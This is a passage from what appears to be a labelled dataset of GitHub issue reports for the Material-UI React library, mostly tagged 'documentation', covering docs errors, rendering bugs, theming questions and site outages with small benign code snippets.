with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.?.?  |\r\n| React        |         |\r\n| Browser      |    Google Chrome Version 71.0.3578.98 (Official Build) (64-bit)   |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nWhen the nav drawer is put on the right side, the punctuation that should be at the end of a sentence is put in front. Screenshot attached. \r\n![bug](https://user-images.githubusercontent.com/8836578/50174883-3c427a00-02b0-11e9-99f9-4133dac8d9ef.PNG)\r\n"},{"labels":[null,"documentation"],"text":"Improve the documentation for how `ListItemSecondaryAction` components work within `ListItem` components.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe documentation would have warnings / implementation details indicating the following:\r\n\r\n- `ListItemSecondaryAction` *must* be the last child of `ListItem` for `ListItem` to detect it has a secondary action ([see source code](https://github.com/mui-org/material-ui/blob/a207808404a703d1ea2b03ac510343be6404b166/packages/material-ui/src/ListItem/ListItem.js#L99)).\r\n- When using a wrapper around `ListItemSecondaryAction`, the `muiName` field *must* be set to `'ListItemSecondaryAction'` (see code above and issue #11622).\r\n- When using a `ListItemSecondaryAction` within a `ListItem`, the component used for the `ListItem` changes (see issue #13597).\r\n\r\nThese would be useful at the top of the API documentation for [ListItemSecondaryAction](https://material-ui.com/api/list-item-secondary-action/) and possibly [ListItem](https://material-ui.com/api/list-item/).\r\n\r\n## Current Behavior 😯\r\n\r\nThese behaviors are undocumented and require hunting through the issues and the code to figure out.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI spent all morning trying to figure out why when I hovered or clicked on my secondary action, it also triggered the list item. I finally figured out it was the order of the children after looking at the code. I was also using a wrapper for `ListItemSecondaryAction`, which had to be fixed too.\r\n\r\nMy use case is that I wanted the secondary action on the left side, not the right side. So I had changed the order of the children, not thinking that just changing the order would affect the behavior of `ListItem`.\r\n\r\nLong-term, the best solution would be to improve the implementation so secondary actions are not so fragile. But I understand there may be other priorities right now.\r\n\r\nOne possibility to explore for a future API is to have the secondary action passed in via a `secondaryActionComponent` prop. Then the `ListItem` would always know whether a secondary action existed and could wrap it within a `ListItemSecondaryAction` internally.\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nNothing\r\n\r\n## Current Behavior 😯\r\n`InputBase.js:308 Uncaught TypeError: _this.inputRef.focus is not a function`\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nLink: https://codesandbox.io/s/w25j5vo7m5\r\n\r\n1. Create DatePicker or TimePicker with disabled prop and keyboardIcon\r\n2. set `<DatePicker disabled={true} keyboardIcon={<Event />} />`\r\n3. Click on keyboardIcon when disabled prop is true\r\n\r\nPerhaps related to https://github.com/mui-org/material-ui/issues/13070 ?\r\n\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.6.2  |\r\n| React        |     v16.5.2    |\r\n| Browser      |   Google Chrome Version 71.0.3578.80 (64 bit)    |\r\n| TypeScript   |   3.6.1      |\r\n| material-ui-pickers        |  2.0.4        |\r\n\r\n"},{"labels":[null,"documentation",null],"text":"\r\n- [x] This is not a v0.x issue.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nPressing backspace/delete should clear the selected option in single select react-select autocomplete demo, just like it used to happen with previous versions.\r\n\r\nhttps://material-ui.com/demos/autocomplete/#react-select \r\n\r\n## Current Behavior 😯\r\nYou can not clear the value with delete/backspace (it happens with native react-select.)\r\n\r\n## Steps to Reproduce 🕹\r\n1. Start typing and then select one of the options\r\n2. Press backspace/delete, nothing happens.\r\n3. You need to press another character key to clear the value.\r\n\r\nLink:\r\n\r\n1. https://codesandbox.io/s/k6p28po47\r\n2. https://material-ui.com/demos/autocomplete/#react-select\r\n\r\n## Context 🔦\r\nUser should be able to clear the value, just like previous versions. It's quite confusing that he/she is unable to clear the entries.\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | latest  |\r\n| React        |   latest      |\r\n| Browser      |  Chrome latest       |\r\n| TypeScript   |    No     |\r\n"},{"labels":[null,"documentation",null],"text":"This is a material-ui.com bug. When I switch to the dark theme and use the searchbox, the autocomplete suggestions are not dark - there's white text on white background. See screenshot:\r\n\r\n<img width=\"828\" alt=\"screen shot 2018-12-10 at 11 30 49\" src=\"https://user-images.githubusercontent.com/19378338/49726788-180ee980-fc6f-11e8-9305-a7d07f57b5e7.png\">\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWhen i open https://material-ui.com/customization/themes/#nesting-the-theme i would expect to know the resulting effective styles are when i write\r\n```\r\nconst GlobalTheme = createMuiTheme({\r\n  palette: {\r\n    primary: {\r\n      main: \"#003B36\"\r\n    },\r\n    secondary: {\r\n      main: \"#D76A03\"\r\n    }\r\n  }\r\n});\r\n\r\nconst LocalTheme = createMuiTheme({\r\n  palette: {\r\n    secondary: {\r\n      main: \"#ECA72C\"\r\n    }\r\n  }\r\n});\r\n\r\n<MuiThemeProvider theme={GlobalTheme}>\r\n    <MuiThemeProvider theme={LocalTheme}>\r\n         <!-- what is the primary color here? -->\r\n    </MuiThemeProvider>\r\n</MuiThemeProvider>\r\n```\r\n\r\n## Current Behavior 😯\r\nAll the docs tell you is: \"The theming solution is very flexible, as you can nest multiple theme providers.\". But it does not tell you what effects nesting has on your theme. \r\n\r\n## Examples 🌈\r\nhttps://material-ui.com/customization/themes/#nesting-the-theme\r\n\r\n## Context 🔦\r\nWithout it being documented, i would have expected that the primary color in the example above wuold be \"#003B36\" - because i did not explicitly define a new one in the `LocalTheme`. While it is okay that the implemented behaviour is different, the actual behaviour should be documented.\r\n\r\nIssues like https://github.com/mui-org/material-ui/issues/6129 and https://github.com/mui-org/material-ui/issues/12496 show, that there is a need for such documentation."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n- Tab into a (non-native) select field\r\n- Use cursor keys to select another item\r\n- Hit tab to go to the next field\r\n\r\nI would expect the Element I selected to be the new value of the Select field.\r\n\r\n## Current Behavior 😯\r\nCurrently, after tabing to the next field, the old value is still set. If i want to have the new one selected, i have to explicitly hit enter before tabing to the next field.\r\n\r\n## Examples 🌈\r\nIf you use the native select instead under windows, the select behaves like expected. This is also a good workaround for this.\r\n\r\n## Context 🔦\r\nWe are building B2B tools where users do recurring tasks that involve filling forms. Every keystroke saved means a lot less annoying UX in those apps. Also, being more aligned with the native behaviour of most browser and OS dropdowns i've seen will create a more fluent user experience."},{"labels":["documentation",null],"text":"The https://material-ui.com/ doesn't work for me pretty often and that happens after static re-generation, most probably a problem with service workers. Right now I have the same issue, index page opens, but the rest doesn't work (even side menu etc).\r\n\r\nI had this open in a tab for a while now, seen the snackbar with \"3.5.1 is out\" or something.\r\nMust say, this kind of caching doesn't really fit the purpose of the website — documentation should not be cached for so long, especially with often releases.\r\n\r\nHere's a console output of my Chrome (I use latest versions of Chrome and macOS):\r\n![image](https://user-images.githubusercontent.com/1391015/49525160-d0c2da80-f8b5-11e8-8093-6b4e05ea4df2.png)\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWebsite works :) \r\n\r\n## Current Behavior 😯\r\nWebsite opens the landing page but the rest is not working. Happens often after releases, Next caching is pretty unstable.\r\nSeveral months ago even a home page didn't open sometimes."},{"labels":["documentation",null],"text":"Reference: https://material-ui.com/customization/themes/#custom-variables\r\n\r\nI followed the reference to add custom variables as I needed more color palettes as opposed to just primary and secondary.\r\n\r\nTypescript keeps complaining `blue: { light: string; main: string; dark: string; contrastText: string; };' is not assignable to parameter of type 'ThemeOptions'`\r\n\r\n```jsx\r\nexport default createMuiTheme({\r\n  palette: {\r\n    primary: {\r\n      light: '#FFB644',\r\n      main: '#FF8500',\r\n      dark: '#C55600',\r\n      contrastText: '#FFFFFF',\r\n    },\r\n    secondary: {\r\n      light: '#96F87D',\r\n      main: '#62C44D',\r\n      dark: '#2A931C',\r\n      contrastText: '#FFFFFF',\r\n    },\r\n    blue: {\r\n      light: '#72C3FF',\r\n      main: '#3393DA',\r\n      dark: '#0066A8',\r\n      contrastText: '#FFFFFF',\r\n    }\r\n}})\r\n```"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nI should be able to override disabled color.\r\n\r\n## Current Behavior 😯\r\nIt is always rgba(0, 0, 0, 0.26)\r\n\r\n![screenshot 2018-12-03 at 17 43 13](https://user-images.githubusercontent.com/2361140/49380504-ea7fe880-f722-11e8-9a9b-26c1b8b00d76.png)\r\n\r\n## Steps to Reproduce 🕹\r\n```\r\nconst styles = theme => ({\r\n  button: {\r\n    width: 8 * theme.spacing.unit,\r\n    height: 8 * theme.spacing.unit,\r\n    color: theme.palette.primary.main\r\n  },\r\n  buttonDisabled: {\r\n    color: theme.palette.grey[900]\r\n  },\r\n  icon: {\r\n    fontSize: theme.spacing.unit * 5\r\n  }\r\n});\r\n\r\n<IconButton\r\n  disabled={true}\r\n  className={classes.button}\r\n  classes={{ disabled: classes.buttonDisabled }}>\r\n  <PauseIcon className={classes.icon} />\r\n</IconButton>\r\n```\r\n\r\n## Your Environment 🌎\r\n\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.6.1  |\r\n| React        |  16.5.2  |\r\n| Browser      |  Chrome Version 70.0.3538.110 (Official Build) (64-bit)  |"},{"labels":["documentation"],"text":"I'm getting an error when converting the next.js app to use `makeStyles`\r\n\r\n```\r\nUnhandled Rejection (Invariant Violation): Hooks can only be called inside the body of a function component.\r\n\r\n  47 | \r\n  48 | // Get the context of the page to collected side effects.\r\n  49 | const pageContext = getPageContext();\r\n> 50 | const page = renderPage((Page) => (props) => {\r\n  51 |   //const pageWithContext = page as Component<InjectPageContext>;\r\n  52 |   return (\r\n  53 |     <JssProvider registry={pageContext.sheetsRegistry} generateClassName={pageContext.generateClassName}>\r\n```\r\n\r\nWould it be possible to update the example or provide tips on how to convert?\r\n"},{"labels":[null,"documentation",null],"text":"The documentation on [Drawers](https://material-ui.com/demos/drawers/) renders incorrectly in Firefox (works fine in Chrome). See gif below (5MB).\r\n\r\n![bug](https://user-images.githubusercontent.com/7766733/49345199-d041fe00-f681-11e8-97bf-00c395a10013.gif)\r\n"},{"labels":["documentation",null],"text":"Does anyone have an example of how to use [React Final Form](https://github.com/final-form/react-final-form) with Material-UI 3.x?"},{"labels":[null,"documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThere is a class that is listed in the docs that is never used (`bar2Determinate`)\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nThere should not be an unused class listed in the docs.\r\n\r\n## Current Behavior 😯\r\nA class is listed in the docs that does nothing\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n[![Edit create-react-app](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/s/5zmozmrkjk)\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| React        |    v16.6.3     |\r\n| Browser      |    any     |\r\n\r\n"},{"labels":[null,"documentation"],"text":"Site is down.\r\nclean cache is not helping.\r\nIt says, unexpected...."},{"labels":[null,null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nAccording to wai-aria guidelines, when dialog is fired - Initial focus should set on the first focusable element.\r\n\r\n see on: https://www.w3.org/TR/wai-aria-practices/examples/dialog-modal/dialog.html\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\n## Current Behavior 😯\r\nThe focus is trapped on the dialog, but not set on the first element. \r\nNeed to press 'Tab' to focus to first element.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| React        |   v16.6.3      |\r\n| Browser      |   chrome 70.0.3538.102       |\r\n\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n`makeStyles()` codesandbox demo should work\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nIt currently errors with: _react.default.useContext is not a function\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/0mpw102k00\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n\r\nDemo needs to be updated to use react 16.7.0 alpha\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nCSS colon selectors should be covered in the documentation. As per my confusion [here](https://stackoverflow.com/questions/53431218/why-is-the-muithemeprovider-overriding-a-component-style)\r\n\r\n## Current Behavior 😯\r\nThey're not covered (here)[https://material-ui.com/customization/overrides/]\r\n\r\nI'm happy to make a pull request if y'all think this is a valid issue."},{"labels":[null,"documentation",null],"text":"Hi. I wonder how can I set the aria-label for a checkbox. When I set the aria-label for Checkbox tag. It sets the aria-label for the wrapper div. Thank you!\r\n"},{"labels":["documentation",null],"text":"## Expected Behavior 🤔\r\nThe documentation should say:\r\nAdding a padding on the parent with, at least, **half** the spacing value:\r\n## Current Behavior 😯\r\nThe documentation says:\r\nAdding a padding on the parent with, at least, the spacing value:\r\n## Steps to Reproduce 🕹\r\n\r\n1. Navigate to [grid doc](https://material-ui.com/layout/grid/#negative-margin)"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and \r\nbelieve that this is not a duplicate.\r\n- [ ] I have checked both on the new version (3.4) and old version (on my system 1.2.3). They are same issue\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nShould be show correct date when scroll to selecting date\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nShow invalid date\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n1. Focus input\r\n2. Select month have 30 days (example: 11/2018)\r\n3. Focus into date value and scroll up => it show 11/31/2018. That's incorrect.\r\n\r\n![screenshot from 2018-11-21 10-20-40](https://user-images.githubusercontent.com/11641322/48817416-f6f65f80-ed78-11e8-95a1-4fc9cd8ef998.png)\r\n\r\nThank you."},{"labels":["documentation",null],"text":"When visiting https://material-ui.com/layout/grid/ and comparing the resulting page in IE11 with what appears in chrome there are clear layout issues visible which undermine confidence in this library's ability to support IE11.\r\n\r\nParticular issues occur in the top-right \"page contents\" area, the CSS Grid Layout example, and the white-space: nowrap; example.\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nPage should render correctly. See Chrome for example.\r\n\r\n## Current Behavior\r\nPage renders improperly.\r\n\r\n## Steps to Reproduce\r\nCompare https://material-ui.com/layout/grid/ in IE11 vs Chrome (latest)\r\n\r\n## Context\r\nOur team is trying to use Material UI for a complex application that requires IE11 support and noticed that performance, in particular with the layout and the menu, was also unacceptably slow. We also noted that the Material UI team states they are supporting unit tests in the following browsers but IE11 is omitted:\r\n\r\nMaterial-UI has 1200+ unit tests running on Chrome 49, Firefox 45, Safari 10 and Edge 14.\r\n\r\nCan we expect these issues to be addressed in the future or does the Material UI team anticipate dropping support for IE11 entirely? This would help us plan for the future.\r\n\r\n## Your Environment\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| Browser      |   IE11      |"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nSupported components page should show an up-to-date list of supported components \r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe current page isn't up to date, here are some incorrect components:\r\n\r\n- Bottom App Bar\r\n- Toggle Buttons\r\n- Extended FAB\r\n- Middle Dividers\r\n- Subheader Dividers\r\n\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n1. Visit: https://material-ui.com/getting-started/supported-components/\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nMaterial-UI Componentss not rendering properly when those are inside <iframe>, I have used many iframe react-comps but still Material UI is not working in any of them.\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\nThere already closed threads without proper answers.\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate and I haven't find any solution.\r\n\r\n## Expected Behavior\r\nIt should render components in iframe as well\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\n## Current Behavior\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nIt is not rendering the components inside iframe, showing plain html elements without any styles\r\n## Steps to Reproduce\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n<iframe src=\"https://codesandbox.io/embed/rjo0r3yooo\" style=\"width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;\" sandbox=\"allow-modals allow-forms allow-popups allow-scripts allow-same-origin\"></iframe>\r\n-->\r\nLink: https://codesandbox.io/s/rjo0r3yooo\r\n\r\n1. Please go to sandbox link provided in the above\r\n\r\n\r\n## Context\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n| React        |   v16.6.3      |\r\n| Browser      |   chrome      |\r\n"},{"labels":["documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nThe latest version 3.5.1 comes with new feature: \r\n\r\n> Allow accessing the component's props from within the style object.\r\n\r\n## Current Behavior\r\nIt works as expected on doc page: https://material-ui.com/customization/overrides/#dynamic-css\r\n\r\n## Steps to Reproduce\r\nThe same example doesn't work on codesandbox.io: \r\n\r\nLink: https://codesandbox.io/s/1y51z1mk2j\r\n\r\n1. button has no background\r\n2. toggle the switch has no effect\r\n\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.5.1  |\r\n"},{"labels":["documentation"],"text":"Sample source code link has been broken. It shows 404. \r\nhttps://github.com/mui-org/material-ui/tree/master/docs/src/pages/page-layout-examples/dashboard"},{"labels":["documentation",null],"text":"- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\n\r\nI can see docs for previous version\r\n\r\n## Current Behavior\r\n\r\nI get a `NET::ERR_CERT_COMMON_NAME_INVALID` error for https://v0.material-ui.com/\r\n\r\n![screen shot 2018-11-13 at 5 46 10 pm](https://user-images.githubusercontent.com/1620605/48454516-5b5b6280-e76c-11e8-8b34-cf27a13ade13.png)\r\n\r\n\r\n## Steps to Reproduce\r\n\r\n- goto https://v0.material-ui.com/\r\n\r\n\r\n## Context\r\n\r\nfind documentation for previous version of MUI that we still use\r\n"},{"labels":[null,"documentation"],"text":"Hi,\r\n\r\nWhat happened to the Page Layout Examples? https://material-ui.com/page-layout-examples/\r\nWas it intentionally removed?\r\nI could still access it as of yesterday:\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/pages/page-layout-examples/sign-in/SignIn.js"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Browser      | Firefox Quantum 63.0.1 (64-bit)  |\r\n| etc.         |   OS Ubuntu 18.10    |\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not 